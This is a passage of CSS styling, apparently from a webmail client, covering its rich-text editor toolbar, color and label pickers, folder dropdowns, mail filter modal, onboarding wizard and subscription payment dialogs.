            left: 25px;
            -webkit-box-shadow: 10px 0 0 0 #888;
            box-shadow: 10px 0 0 0 #888;
            border: 1px solid #acb0bf
        }

        .squireToolbar-triangle-with-shadow:hover,
        .triangle-with-shadow:hover:after {
            -webkit-box-shadow: none;
            box-shadow: none
        }

        .squireToolbar-show-subrow .squireToolbar-triangle-with-shadow {
            opacity: 1
        }

        .squireSelectFontSize-container .value {
            text-align: center
        }

        .squireSelectFontSize-container .squireToolbar-select-view {
            width: 50px
        }

        .squireSelectFontFamily-container .squireToolbar-select-view {
            width: 111px
        }

        .squireSelectFontFamily-container button,
        .squireSelectFontSize-container button {
            margin: 0 !important;
            width: 100% !important;
            padding: 0 .5em !important
        }

        @media (max-width:440px) {
            [class*=squireToolbar-action-] {
                width: 26px;
                margin: 2px
            }

            .squireToolbar-action-color {
                width: 42px
            }

            .squireToolbar-action-options {
                width: 36px
            }
        }

        .colorList-container {
            -webkit-box-orient: vertical;
            -webkit-box-direction: normal;
            -webkit-flex-direction: column;
            -ms-flex-direction: column;
            flex-direction: column;
            -webkit-flex-wrap: wrap;
            -ms-flex-wrap: wrap;
            flex-wrap: wrap
        }

        .colorList-container,
        .colorList-list {
            display: -webkit-box;
            display: -webkit-flex;
            display: -ms-flexbox;
            display: flex
        }

        .colorList-list {
            margin: 0;
            padding: 0;
            margin-top: .1em !important;
            list-style: none
        }

        .colorList-list+.colorList-list {
            margin-top: 1px
        }

        .colorList-item {
            margin: .1em;
            border-radius: 2px;
            background: currentColor
        }

        .colorList-btn-choose {
            background: transparent;
            padding: 0;
            margin: 0;
            width: 1.4em;
            height: 1.4em;
            border: 0
        }

        .colorList-btn-choose .fa {
            pointer-events: none;
            opacity: 0;
            color: inherit;
            -webkit-filter: invert(100%) brightness(500%);
            filter: invert(100%) brightness(500%)
        }

        .colorList-btn-choose.active .fa,
        .colorList-btn-choose:hover .fa,
        [data-is-empty] .colorList-item:first-child .fa {
            -webkit-box-shadow: 0 0 1px rgba(0, 0, 0, .5);
            box-shadow: 0 0 1px rgba(0, 0, 0, .5);
            opacity: 1
        }

        .addFilePopover-container:not(.addFilePopover-allow-embedded) .addFilePopover-btn-embedded,
        .addFilePopover-container:not(.addFilePopover-allow-uri) .addFilePopover-btn-uri,
        .addFilePopover-input-file,
        .addLinkPopover-container:not(.addLinkPopover-editable) .addLinkPopover-btn-edit,
        .addLinkPopover-container:not(.addLinkPopover-editable) .addLinkPopover-btn-remove,
        .addLinkPopover-editable .addLinkPopover-btn-new {
            display: none
        }

        .colorPopover-container {
            width: auto
        }

        .colorPopover-container:not([data-mode=highlight]) .colorPopover-title-highlight,
        .colorPopover-container[data-mode=highlight] .colorPopover-title {
            display: none
        }

        .colorPopover-selection {
            height: 1.4em
        }

        .colorPopover-custom {
            display: -webkit-box;
            display: -webkit-flex;
            display: -ms-flexbox;
            display: flex;
            -webkit-box-pack: justify;
            -webkit-justify-content: space-between;
            -ms-flex-pack: justify;
            justify-content: space-between;
            margin-top: .5em
        }

        .colorPopover-custom input[type=text] {
            width: 100px;
            height: auto;
            line-height: normal;
            padding: .2em .5em;
            -webkit-box-shadow: none;
            box-shadow: none;
            margin: 0
        }

        .colorPopover-input-selectColor {
            margin: 0 !important
        }

        .colorPopover-btn-choose.colorPopover-btn-choose.colorPopover-btn-choose {
            height: auto;
            line-height: normal;
            padding: .2em .5em
        }

        .colorPopover-footer {
            padding: .5em !important
        }

        [class*=colorPopover-title] {
            font-size: 1em;
            padding: .5em .5em 0;
            text-align: left;
            font-weight: 400;
            margin: 0
        }

        .colorPopover-container[data-mode=highlight] {
            -webkit-box-shadow: 0 1px 2px rgba(0, 0, 0, .15);
            box-shadow: 0 1px 2px rgba(0, 0, 0, .15)
        }

        .squire-container {
            position: relative
        }

        .squire-container[data-editor-mode="text/html"] .plaintext-editor,
        .squire-container[data-editor-mode="text/plain"] .angular-squire-wrapper,
        .squire-container[data-type-content=signature] .plaintext-editor {
            display: none !important
        }

        .squire-container:not(.editorDropzone-enter) .squire-dropzone,
        .squire-container:not(.squireEditor-loaded) .plaintext-editor {
            display: none
        }

        .editorDropzone-enter {
            -webkit-box-sizing: border-box;
            box-sizing: border-box
        }

        .squire-dropzone {
            position: absolute;
            top: 0;
            right: 0;
            height: calc(100% - 2em);
            width: calc(100% - 2em);
            background: #fff;
            z-index: 2001;
            border: 1rem solid rgba(0, 0, 0, .05);
            display: -webkit-box;
            display: -webkit-flex;
            display: -ms-flexbox;
            display: flex;
            -webkit-box-pack: center;
            -webkit-justify-content: center;
            -ms-flex-pack: center;
            justify-content: center;
            -webkit-align-content: center;
            -ms-flex-line-pack: center;
            align-content: center;
            -webkit-box-align: center;
            -webkit-align-items: center;
            -ms-flex-align: center;
            align-items: center
        }

        .pm_invalid .angular-squire-wrapper {
            border-color: #cc9393 !important;
            border-width: 2rem
        }

        .plaintext-editor {
            -webkit-box-flex: 1;
            -webkit-flex: 1;
            -ms-flex: 1;
            flex: 1;
            width: 100%;
            height: 100%;
            -webkit-box-sizing: border-box;
            box-sizing: border-box;
            z-index: 50;
            margin: 0;
            outline: none;
            resize: none;
            border: none;
            padding: 1rem 10px;
            font-size: .9rem
        }

        .editor-container {
            position: relative
        }

        .composer-container.minimized .composer-section {
            display: none !important
        }

        .labelModal-container .pm_button.primary {
            padding: 0 1rem
        }

        .labelModal-list,
        .labelModal-list * {
            -webkit-box-sizing: border-box;
            box-sizing: border-box
        }

        .labelModal-list {
            list-style-type: none;
            -webkit-flex-wrap: wrap;
            -ms-flex-wrap: wrap;
            flex-wrap: wrap;
            margin: 0
        }

        .labelModal-item,
        .labelModal-list {
            display: -webkit-box;
            display: -webkit-flex;
            display: -ms-flexbox;
            display: flex;
            padding: 0
        }

        .labelModal-item {
            position: relative;
            -webkit-box-pack: center;
            -webkit-justify-content: center;
            -ms-flex-pack: center;
            justify-content: center;
            -webkit-box-align: center;
            -webkit-align-items: center;
            -ms-flex-align: center;
            align-items: center;
            height: 2rem;
            width: 2rem;
            min-width: 2rem;
            border-radius: 50%;
            margin: 0 .35rem .35rem 0;
            overflow: hidden
        }

        .labelModal-item .fa {
            opacity: 0;
            color: #fff;
            display: inline-block;
            -webkit-transition: opacity .1s linear;
            transition: opacity .1s linear
        }

        .labelModal-item:hover .fa {
            opacity: .25
        }

        .labelModal-item-mask {
            display: -webkit-inline-box;
            display: -webkit-inline-flex;
            display: -ms-inline-flexbox;
            display: inline-flex;
            -webkit-box-pack: center;
            -webkit-justify-content: center;
            -ms-flex-pack: center;
            justify-content: center;
            -webkit-box-align: center;
            -webkit-align-items: center;
            -ms-flex-align: center;
            align-items: center;
            border-radius: 50%;
            z-index: 2;
            background: currentColor;
            border: 2px solid #fff;
            pointer-events: none;
            -webkit-transition: border .1s ease-out;
            transition: border .1s ease-out
        }

        .labelModal-input-color,
        .labelModal-item-mask {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%
        }

        .labelModal-input-color {
            z-index: 1;
            opacity: 0;
            margin: 0;
            cursor: pointer
        }

        .labelModal-input-color:checked+.labelModal-item-mask .fa {
            opacity: 1
        }

        .labelModal-input-color:checked+.labelModal-item-mask,
        .labelModal-input-color:focus+.labelModal-item-mask {
            border: 3px solid rgba(0, 0, 0, .1)
        }

        .labelsElement-label:before {
            color: attr(data-color)
        }

        .labelsElement-label {
            border: 2px solid currentColor !important
        }

        .labelsElement-label * {
            pointer-events: none
        }

        .labelsState-item-icon {
            margin: 0 .5rem;
            line-height: 32px;
            float: left
        }

        .labelsState-toggle-label {
            margin-right: .5rem
        }

        .settingsLabels-container .help-dnd {
            text-align: right
        }

        .appConfigBody-is-mobile .settingsLabels-container .help-dnd {
            text-align: left
        }

        .dropdown-folder-container {
            margin: -15px 0
        }

        .dropdown-folder-title {
            margin: 0 -15px;
            padding: 0 15px;
            border-bottom: 1px solid rgba(172, 176, 191, .1)
        }

        .dropdown-folder-title>p {
            height: 11px;
            line-height: 14px
        }

        .dropdown-folder-search {
            display: -webkit-flex;
            display: -webkit-box;
            display: -ms-flexbox;
            display: flex;
            -webkit-align-items: center;
            -webkit-box-align: center;
            -ms-flex-align: center;
            align-items: center;
            margin: 0 -5px;
            padding: 0 5px
        }

        .dropdown-folder-search .fa.dropdown-folder-search-icon {
            font-size: 1em;
            color: #9397cd;
            margin-right: 10px
        }

        .dropdown-folder-search .dropdown-folder-search-input {
            -webkit-flex-grow: 1;
            -webkit-box-flex: 1;
            -ms-flex-positive: 1;
            flex-grow: 1;
            overflow: hidden;
            height: 30px;
            padding: 0;
            border: none;
            border-radius: 0;
            -webkit-box-shadow: none;
            box-shadow: none;
            background: transparent;
            width: 100%;
            font-size: 1em;
            outline: none;
            -webkit-appearance: none;
            -moz-appearance: none;
            appearance: none
        }

        .dropdown-folder-create.pm_button,
        .dropdown-folder-fullwidth {
            display: block;
            margin: 0 -15px;
            padding: 0 15px
        }

        .dropdown-folder-create.pm_button {
            margin: .5rem -10px
        }

        .dropdown-folder-scrollbox-group-item-button {
            background: transparent;
            width: 100%;
            height: 30px;
            border: 0;
            padding: 0;
            text-align: left;
            cursor: pointer
        }

        .dropdown-folder-scrollbox-group-item-button>div {
            display: -webkit-flex;
            display: -webkit-box;
            display: -ms-flexbox;
            display: flex;
            -webkit-align-items: center;
            -webkit-box-align: center;
            -ms-flex-align: center;
            align-items: center;
            pointer-events: none
        }

        .dropdown-folder-scrollbox-group-item-icon {
            margin-right: 10px;
            font-size: 16px;
            pointer-events: none
        }

        .dropdown-folder-create-button {
            -webkit-box-sizing: border-box;
            box-sizing: border-box;
            height: auto;
            min-height: 40px;
            width: 100%;
            padding: 0;
            border: 0;
            line-height: 16px;
            font-weight: 700;
            background: transparent;
            word-wrap: break-word;
            text-transform: none;
            text-align: left;
            color: #9397cd;
            cursor: pointer
        }

        .appConfigBody-is-mobile .dropdown-folder-scrollbox-group-item {
            height: 45px;
            padding: 0;
            -webkit-box-sizing: border-box;
            box-sizing: border-box;
            border: 1px solid #acb0bf;
            margin-bottom: 5px
        }

        .appConfigBody-is-mobile .dropdown-folder-scrollbox-group-item-button {
            height: 45px;
            padding: 0 10px
        }

        .dropdown-label-container {
            margin: -15px 0
        }

        .dropdown-label-title {
            margin: 0 -15px;
            padding: 0 15px;
            border-bottom: 1px solid rgba(172, 176, 191, .1)
        }

        .dropdown-label-title>p {
            height: 11px;
            line-height: 14px
        }

        .dropdown-label-search {
            display: -webkit-flex;
            display: -webkit-box;
            display: -ms-flexbox;
            display: flex;
            -webkit-align-items: center;
            -webkit-box-align: center;
            -ms-flex-align: center;
            align-items: center;
            margin: 0 -15px;
            padding: 0 15px
        }

        .dropdown-label-search .fa.dropdown-label-search-icon {
            font-size: 1em;
            color: #9397cd;
            margin-right: 10px
        }

        .dropdown-label-search .dropdown-label-search-input {
            -webkit-flex-grow: 1;
            -webkit-box-flex: 1;
            -ms-flex-positive: 1;
            flex-grow: 1;
            overflow: hidden;
            height: 30px;
            padding: 0;
            border: none;
            border-radius: 0;
            -webkit-box-shadow: none;
            box-shadow: none;
            background: transparent;
            width: 100%;
            font-size: 1em;
            outline: none;
            -webkit-appearance: none;
            -moz-appearance: none;
            appearance: none
        }

        .dropdown-label-alsoArchive,
        .dropdown-label-scrollbox {
            display: block;
            margin: 0 -15px;
            padding: 0 15px
        }

        .dropdown-label-scrollbox-label {
            display: -webkit-inline-flex;
            display: -webkit-inline-box;
            display: -ms-inline-flexbox;
            display: inline-flex;
            -webkit-align-items: center;
            -webkit-box-align: center;
            -ms-flex-align: center;
            align-items: center;
            cursor: pointer;
            max-height: 100%;
            width: 100%;
            height: 30px
        }

        .dropdown-label-alsoArchive-txt,
        .dropdown-label-scrollbox-label-text {
            -webkit-flex-grow: 1;
            -webkit-box-flex: 1;
            -ms-flex-positive: 1;
            flex-grow: 1;
            overflow: hidden;
            display: -webkit-box;
            display: -webkit-flex;
            display: -ms-flexbox;
            display: flex;
            -webkit-box-align: center;
            -webkit-align-items: center;
            -ms-flex-align: center;
            align-items: center
        }

        .dropdown-label-scrollbox-label-text {
            pointer-events: none
        }

        .dropdown-label-scrollbox-label-icon {
            pointer-events: all
        }

        .dropdown-label-alsoArchive-checkbox,
        .dropdown-label-scrollbox-label-checkbox {
            width: 16px
        }

        [class*=dropdown-label-scrollbox-label-icon] {
            margin-right: 10px;
            font-size: 16px
        }

        .dropdown-label-scrollbox-label-text-ellipsis {
            max-width: calc(100% - 40px);
            color: #555
        }

        .dropdown-label-alsoArchive {
            display: -webkit-flex;
            display: -webkit-box;
            display: -ms-flexbox;
            display: flex;
            -webkit-align-items: center;
            -webkit-box-align: center;
            -ms-flex-align: center;
            align-items: center;
            height: 45px;
            clear: both;
            padding: 0 15px;
            text-align: left;
            border-top: 1px solid #acb0bf
        }

        .dropdown-label-apply {
            width: 100%;
            margin-bottom: 10px
        }

        .dropdown-label-container.dropdown-label-hasLabels .alert-info,
        .dropdown-label-container:not(.dropdown-label-hasLabels) .dropdown-label-alsoArchive,
        .dropdown-label-container:not(.dropdown-label-hasLabels) .dropdown-label-apply,
        .dropdown-label-container:not(.dropdown-label-hasLabels) .dropdown-label-search,
        .dropdown-label-container:not(.dropdown-label-hasLabels) .dropdown-label-title-hasLabels {
            display: none
        }

        .dropdown-label-container:not(.dropdown-label-hasLabels) .createLabel-button {
            min-height: 40px
        }

        .appConfigBody-is-mobile .dropdown-label-scrollbox .scrollbox-container-group-item {
            height: 45px;
            padding: 0 10px;
            -webkit-box-sizing: border-box;
            box-sizing: border-box;
            border: 1px solid #acb0bf;
            margin-bottom: 5px
        }

        .appConfigBody-is-mobile .dropdown-label-alsoArchive-checkbox,
        .appConfigBody-is-mobile .dropdown-label-scrollbox-label-checkbox {
            width: 32px
        }

        .emailBlockList-row {
            pointer-events: none
        }

        [class*=emailBlockList-btn] {
            pointer-events: all
        }

        [class*=emailBlockList-btn] * {
            pointer-events: none
        }

        .filter-modal-input-name+.filter-modal-alert {
            visibility: hidden;
            margin-bottom: 0
        }

        .filter-modal-input-name.ng-empty:not(:focus)~.filter-modal-alert {
            visibility: visible
        }

        .filter-modal-conditions {
            -webkit-flex-wrap: wrap;
            -ms-flex-wrap: wrap;
            flex-wrap: wrap;
            width: 100%
        }

        .filter-modal-condition,
        .filter-modal-conditions {
            display: -webkit-inline-flex;
            display: -webkit-inline-box;
            display: -ms-inline-flexbox;
            display: inline-flex
        }

        .filter-modal-condition {
            -webkit-flex-grow: 1;
            -webkit-box-flex: 1;
            -ms-flex-positive: 1;
            flex-grow: 1;
            overflow: hidden;
            padding-right: 15px;
            overflow: initial
        }

        .filter-modal-condition-if {
            -webkit-align-items: center;
            -webkit-box-align: center;
            -ms-flex-align: center;
            align-items: center;
            height: 34px;
            padding-right: .5rem
        }

        .filter-modal-condition-attachments,
        .filter-modal-condition-if {
            display: -webkit-inline-flex;
            display: -webkit-inline-box;
            display: -ms-inline-flexbox;
            display: inline-flex
        }

        .filter-modal-condition-attachments label {
            margin-left: .5rem
        }

        .filter-modal-condition-settings {
            display: -webkit-inline-flex;
            display: -webkit-inline-box;
            display: -ms-inline-flexbox;
            display: inline-flex;
            -webkit-flex-grow: 1;
            -webkit-box-flex: 1;
            -ms-flex-positive: 1;
            flex-grow: 1;
            overflow: hidden;
            -webkit-flex-wrap: wrap;
            -ms-flex-wrap: wrap;
            flex-wrap: wrap;
            -webkit-align-items: center;
            -webkit-box-align: center;
            -ms-flex-align: center;
            align-items: center;
            overflow: initial
        }

        .filter-modal-add-condition-autocomplete {
            position: relative
        }

        .filter-modal-simple-condition {
            width: 100%
        }

        .filter-modal-condition-remove {
            -webkit-justify-content: flex-end;
            -webkit-box-pack: end;
            -ms-flex-pack: end;
            justify-content: flex-end;
            -webkit-flex-basis: 55px;
            -ms-flex-preferred-size: 55px;
            flex-basis: 55px;
            -webkit-box-ordinal-group: 2;
            -webkit-order: 1;
            -ms-flex-order: 1;
            order: 1
        }

        .filter-modal-condition-badges,
        .filter-modal-condition-remove {
            display: -webkit-inline-flex;
            display: -webkit-inline-box;
            display: -ms-inline-flexbox;
            display: inline-flex
        }

        .filter-modal-condition-badges {
            -webkit-align-items: center;
            -webkit-box-align: center;
            -ms-flex-align: center;
            align-items: center
        }

        .filter-modal-condition-badge {
            line-height: 2;
            height: auto
        }

        .filter-modal-condition-or {
            margin: 0 .5rem;
            font-size: 75%
        }

        .filter-modal-add-condition {
            display: -webkit-inline-flex;
            display: -webkit-inline-box;
            display: -ms-inline-flexbox;
            display: inline-flex;
            -webkit-flex-basis: 15rem;
            -ms-flex-preferred-size: 15rem;
            flex-basis: 15rem
        }

        .filter-modal-add-condition-input {
            width: 12rem
        }

        .filter-modal-add-condition-button {
            margin-left: -4px;
            width: 40px
        }

        .filter-modal-add-condition-button,
        .filter-modal-add-condition-button:hover {
            background: #9397cd;
            border-color: transparent;
            color: #fff
        }

        .filter-modal-add-condition-button[disabled] {
            background: #eaeaea;
            border-color: rgba(0, 0, 0, .2);
            opacity: 1;
            color: rgba(0, 0, 0, .4)
        }

        .filter-modal-separator {
            display: -webkit-inline-flex;
            display: -webkit-inline-box;
            display: -ms-inline-flexbox;
            display: inline-flex;
            -webkit-align-items: center;
            -webkit-box-align: center;
            -ms-flex-align: center;
            align-items: center;
            height: 35px
        }

        .filter-modal-label-container {
            display: -webkit-flex;
            display: -webkit-box;
            display: -ms-flexbox;
            display: flex;
            -webkit-flex-wrap: wrap;
            -ms-flex-wrap: wrap;
            flex-wrap: wrap
        }

        .filter-modal-label,
        .filter-modal-label-add {
            min-height: 3rem
        }

        .filter-modal-label i {
            margin: .1rem .5rem .1rem 0
        }

        .filter-modal-label-add {
            display: -webkit-inline-flex;
            display: -webkit-inline-box;
            display: -ms-inline-flexbox;
            display: inline-flex;
            -webkit-align-items: center;
            -webkit-box-align: center;
            -ms-flex-align: center;
            align-items: center
        }

        .filter-modal-condition-remove,
        .filter-modal-condition-settings>*,
        .filter-modal-separator>* {
            margin: .2rem
        }

        .filter-modal-simple .filter-complex-only {
            display: none
        }

        body.appConfigBody-is-mobile .filter-modal-complex .sieve-script {
            -webkit-box-orient: vertical;
            -webkit-box-direction: normal;
            -webkit-flex-direction: column;
            -ms-flex-direction: column;
            flex-direction: column
        }

        body.appConfigBody-is-mobile .filter-modal-complex .modal-dialog {
            height: 100%;
            min-height: 700px
        }

        .filter-modal-complex .filter-simple-only {
            display: none
        }

        .filter-modal-complex .modal-body,
        .filter-modal-complex .modal-content,
        .filter-modal-complex .modal-dialog,
        .filter-modal-complex .sieve-script,
        .filter-modal-complex .sieve-script #filterScriptContainer {
            display: -webkit-box;
            display: -webkit-flex;
            display: -ms-flexbox;
            display: flex
        }

        .filter-modal-complex .modal-body,
        .filter-modal-complex .modal-content,
        .filter-modal-complex .modal-dialog {
            -webkit-box-orient: vertical;
            -webkit-box-direction: normal;
            -webkit-flex-direction: column;
            -ms-flex-direction: column;
            flex-direction: column
        }

        .filter-modal-complex .modal-dialog {
            height: calc(100% - 6rem);
            min-height: 600px
        }

        .filter-modal-complex .modal-body,
        .filter-modal-complex .modal-content,
        .filter-modal-complex .sieve-script,
        .filter-modal-complex .sieve-script #filterScriptContainer {
            -webkit-box-flex: 1;
            -webkit-flex-grow: 1;
            -ms-flex-positive: 1;
            flex-grow: 1
        }

        .filter-modal-complex .CodeMirror {
            height: 100%
        }

        .filter-modal-complex #filterScriptContainer {
            position: relative
        }

        .filter-modal-complex #filterScript {
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0
        }

        .addressKeysView-container th.finger-print {
            min-width: 360px
        }

        .addressKeysView-container th.key-size {
            min-width: 80px
        }

        .addressKeysView-container th.actions {
            width: 100px
        }

        .addressKeysView-email,
        .addressKeysView-toggle {
            float: left
        }

        .addressKeysView-toggle {
            width: 30px
        }

        .addressKeysView-email {
            width: calc(100% - 30px)
        }

        .addressKeysView-container.address [data-display-mode=user],
        .addressKeysView-container.user [data-display-mode=address] {
            display: none
        }

        .pm_toolbar {
            -webkit-box-shadow: inset 0 -1px 0 #acb0bf;
            box-shadow: inset 0 -1px 0 #acb0bf;
            -webkit-box-sizing: border-box;
            box-sizing: border-box;
            width: 100%;
            padding: 10px
        }

        .pm_toolbar.pm_toolbar_withSelector {
            padding: 10px 10px 10px 4px
        }

        .toolbarDesktop-container {
            height: 56px;
            position: relative;
            z-index: 8;
            display: -webkit-box;
            display: -webkit-flex;
            display: -ms-flexbox;
            display: flex
        }

        .toolbarDesktop-container .toolbarDesktop-actions-right {
            display: -webkit-flex;
            display: -webkit-box;
            display: -ms-flexbox;
            display: flex;
            margin-left: auto
        }

        .toolbarDesktop-container .pm_checkbox {
            float: left;
            display: block;
            height: 34px;
            line-height: 34px;
            margin: 0
        }

        .toolbarDesktop-container .fa-check-square,
        .toolbarDesktop-container .fa-square-o,
        .toolbarDesktop-container .pm_checkbox {
            float: left
        }

        .toolbarDesktop-container .fa-check-square,
        .toolbarDesktop-container .fa-square-o {
            margin: 0 5px
        }

        .toolbarDesktop-container .layout a img {
            display: block;
            height: 16px;
            width: 16px;
            position: relative
        }

        .toolbarMobile-container {
            height: 70px;
            padding: 10px
        }

        .toolbarMobile-container .pm_buttons,
        .toolbarMobile-container .pm_buttons a {
            height: 48px
        }

        .toolbarMobile-container .pm_buttons a {
            padding: 0 8px
        }

        .toolbarMobile-container>.pm_buttons,
        .toolbarMobile-container>.pull-right {
            margin-top: 0
        }

        .toolbarMobile-container .pm_checkbox {
            float: left;
            margin-right: 10px;
            padding-top: 10px
        }

        .toolbarMobile-container .pm_checkbox input[type=checkbox] {
            margin: 0
        }

        .toolbarMobile-container .pm_buttons {
            position: static
        }

        .toolbarMobile-container .pm_dropdown {
            left: 0 !important;
            right: 0 !important;
            top: 134px;
            width: 100%;
            z-index: 888
        }

        .tooltip.tour .tooltip-inner {
            background-color: #34cc69;
            -webkit-box-shadow: 0 1px 1px rgba(0, 0, 0, .1);
            box-shadow: 0 1px 1px rgba(0, 0, 0, .1)
        }

        .tooltip.tour.top-left .tooltip-arrow,
        .tooltip.tour.top-right .tooltip-arrow,
        .tooltip.tour.top .tooltip-arrow {
            border-top-color: #34cc69
        }

        .tooltip.tour.right .tooltip-arrow {
            border-right-color: #34cc69
        }

        .tooltip.tour.left .tooltip-arrow {
            border-left-color: #34cc69
        }

        .tooltip.tour.bottom-left .tooltip-arrow,
        .tooltip.tour.bottom-right .tooltip-arrow,
        .tooltip.tour.bottom .tooltip-arrow {
            border-bottom-color: #34cc69
        }

        .appConfigBody-tourActive .sidebarApp-link[href="/labels"] {
            overflow: visible
        }

        #pm_wizard {
            position: fixed;
            left: 0;
            bottom: 0;
            right: 0;
            z-index: 9999;
            -webkit-box-shadow: 0 -1rem 1rem rgba(0, 0, 0, .1);
            box-shadow: 0 -1rem 1rem rgba(0, 0, 0, .1);
            -webkit-box-sizing: border-box;
            box-sizing: border-box;
            width: 100%;
            background: #fff;
            padding: 2rem 14rem 2rem 8rem
        }

        #pm_wizard [class^=step-] {
            display: none
        }

        #pm_wizard .close {
            display: block;
            position: absolute;
            right: 0;
            top: 0;
            padding: 0 1rem;
            background: inherit;
            border: 0;
            line-height: 2rem;
            cursor: pointer;
            color: #9397cd;
            text-decoration: none;
            font-size: .8em
        }

        #pm_wizard .badge {
            font-size: 2rem;
            color: #e1e1e1;
            border: 1px solid #acb0bf;
            border-radius: 4rem;
            line-height: 4rem;
            width: 4rem;
            height: 4rem;
            left: 2rem;
            font-weight: 400;
            top: 3rem
        }

        #pm_wizard .badge,
        #pm_wizard .navigation {
            text-align: center;
            display: block;
            position: absolute
        }

        #pm_wizard .navigation {
            right: 2rem;
            top: 3.5rem;
            width: 10rem
        }

        #pm_wizard .navigation .pagination {
            display: block;
            list-style-type: none;
            margin: 0;
            padding: 1rem 0;
            text-align: center
        }

        #pm_wizard .navigation .pagination li {
            display: inline-block;
            list-style-type: none;
            margin: 0 1px;
            padding: 0;
            height: 12px;
            width: 12px;
            border-radius: 12px
        }

        #pm_wizard .navigation .pagination a {
            display: block;
            list-style-type: none;
            margin: 0;
            padding: 0;
            height: 12px;
            width: 12px;
            border-radius: 12px;
            background-color: #acb0bf
        }

        #pm_wizard [class^=step-] .body strong {
            color: #34cc69
        }

        #pm_wizard.wizardStep-1 .step-1,
        #pm_wizard.wizardStep-2 .step-2,
        #pm_wizard.wizardStep-3 .step-3,
        #pm_wizard.wizardStep-4 .step-4 {
            display: block
        }

        #pm_wizard.wizardStep-1 .pagination .pagination-step-1 a,
        #pm_wizard.wizardStep-2 .pagination .pagination-step-2 a,
        #pm_wizard.wizardStep-3 .pagination .pagination-step-3 a,
        #pm_wizard.wizardStep-4 .pagination .pagination-step-4 a {
            background-color: #9397cd
        }

        .wizardStep-hidden {
            display: none
        }

        #welcomeModal .pm_form {
            width: 80%;
            margin: auto
        }

        .monetize .modal-dialog .modal-content .upsell {
            position: relative;
            height: 18rem;
            float: left;
            width: 100%
        }

        .monetize .modal-dialog .modal-content .upsell h3,
        .monetize .modal-dialog .modal-content .upsell h4,
        .monetize .modal-dialog .modal-content .upsell ul {
            display: block;
            position: relative;
            z-index: 8
        }

        .monetize .modal-dialog .modal-content .upsell h4 {
            color: #9397cd;
            font-weight: 700;
            font-size: 1.2rem;
            padding: 2rem 1rem 0 2rem
        }

        .monetize .modal-dialog .modal-content .upsell h4 span {
            font-weight: 400
        }

        .monetize .modal-dialog .modal-content .upsell ul {
            color: #fff;
            padding: 0 3rem
        }

        .monetize .modal-dialog .modal-content .upsell button {
            position: relative;
            z-index: 5;
            left: 3rem
        }

        .monetize .modal-dialog .modal-content .upsell>a {
            position: absolute;
            right: 0;
            top: 3rem
        }

        .tosubscribeOverview-head {
            display: -webkit-box;
            display: -webkit-flex;
            display: -ms-flexbox;
            display: flex;
            -webkit-box-pack: justify;
            -webkit-justify-content: space-between;
            -ms-flex-pack: justify;
            justify-content: space-between;
            padding: 0 1em;
            background: #e6eaf0;
            border-top: 1px solid #acb0bf;
            border-bottom: 1px solid #acb0bf;
            color: #6f6f6f;
            font-weight: 400;
            text-transform: uppercase
        }

        .tosubscribeOverview-head [class*=tosubscribeOverview-title][class*=tosubscribeOverview-title][class*=tosubscribeOverview-title] {
            font-size: 1em;
            color: inherit
        }

        .tosubscribeOverview-list {
            padding: 0;
            margin: 0
        }

        .tosubscribeOverview-list-about {
            padding: 0;
            margin-left: 1em
        }

        .tosubscribeOverview-item+.tosubscribeOverview-item,
        .tosubscribeOverview-item:first-child {
            border-bottom: 1px solid #acb0bf
        }

        .tosubscribeOverview-item {
            list-style: none;
            margin: 0;
            padding: 0 1em
        }

        .tosubscribeOverview-item-title {
            line-height: normal !important;
            font-weight: 400 !important;
            font-size: 1em !important;
            color: inherit !important
        }

        .tosubscribeOverview-discount {
            border-radius: 2px;
            border: 1px solid #ff5400;
            color: #ff5400;
            font-size: .85em;
            font-weight: 700;
            padding: 1px 3px
        }

        .tosubscribeOverview-discount:hover {
            color: #fff;
            background-color: #ff5400
        }

        .tosubscribeOverview-item-header,
        .tosubscribeOverview-item:not([data-plan]),
        [class*=tosubscribeOverview-about] {
            display: -webkit-box;
            display: -webkit-flex;
            display: -ms-flexbox;
            display: flex;
            -webkit-box-pack: justify;
            -webkit-justify-content: space-between;
            -ms-flex-pack: justify;
            justify-content: space-between;
            height: 36px;
            -webkit-box-align: center;
            -webkit-align-items: center;
            -ms-flex-align: center;
            align-items: center
        }

        [class*=tosubscribeOverview-about] {
            -webkit-box-pack: start;
            -webkit-justify-content: flex-start;
            -ms-flex-pack: start;
            justify-content: flex-start
        }

        .tosubscribeOverview-about-type {
            padding: 0 .5em
        }

        .tosubscribeOverview-price {
            margin-left: auto
        }

        .payInvoiceModal-form:not(.payInvoiceModal-method-bitcoin) .payInvoiceModal-btn-close,
        .tosubscribeOverview-item:not([data-cycle="12"]) [data-discount="20"],
        .tosubscribeOverview-item:not([data-cycle="24"]) [data-discount="33"],
        .tosubscribeOverview-item[data-cycle="1"] .tosubscribeOverview-price-scope,
        .tosubscribeOverview-item[data-cycle="1"] [class*=-yearly],
        .tosubscribeOverview-item[data-cycle="12"] [class*=-monthly],
        .tosubscribeOverview-item[data-cycle="24"] [class*=-monthly] {
            display: none
        }

        .payInvoiceModal-method-bitcoin .payInvoiceModal-group-btn,
        .payInvoiceModal-method-paypal .payInvoiceModal-group-btn {
            display: -webkit-box;
            display: -webkit-flex;
            display: -ms-flexbox;
            display: flex;
            -webkit-box-pack: end;
            -webkit-justify-content: flex-end;
            -ms-flex-pack: end;
            justify-content: flex-end
        }

        .payInvoiceModal-method-bitcoin .payInvoiceModal-btn-cancel,
        .payInvoiceModal-method-bitcoin .payInvoiceModal-btn-submit,
        .payInvoiceModal-method-paypal .payInvoiceModal-btn-submit {
            display: none
        }

        .featuresList-container {
            display: -webkit-box;
            display: -webkit-flex;
            display: -ms-flexbox;
            display: flex;
            list-style: none;
            padding: 0;
            margin: 0
        }

        .featuresList-container>li {
            -webkit-box-flex: 1;
            -webkit-flex-grow: 1;
            -ms-flex-positive: 1;
            flex-grow: 1;
            padding: 0;
            margin: 0
        }

        .featuresList-button {
            padding: 0;
            margin: 0 6px;
            border: 0;
            background: transparent;
            opacity: .8
        }

        .featuresList-button-wrapper {
            display: -webkit-box;
            display: -webkit-flex;
            display: -ms-flexbox;
            display: flex;
            -webkit-box-orient: vertical;
            -webkit-box-direction: normal;
            -webkit-flex-direction: column;
            -ms-flex-direction: column;
            flex-direction: column;
            -webkit-box-pack: center;
            -webkit-justify-content: center;
            -ms-flex-pack: center;
            justify-content: center;
            -webkit-box-align: center;
            -webkit-align-items: center;
            -ms-flex-align: center;
            align-items: center;
            padding: 20px 0
        }

        .featuresList-logo {
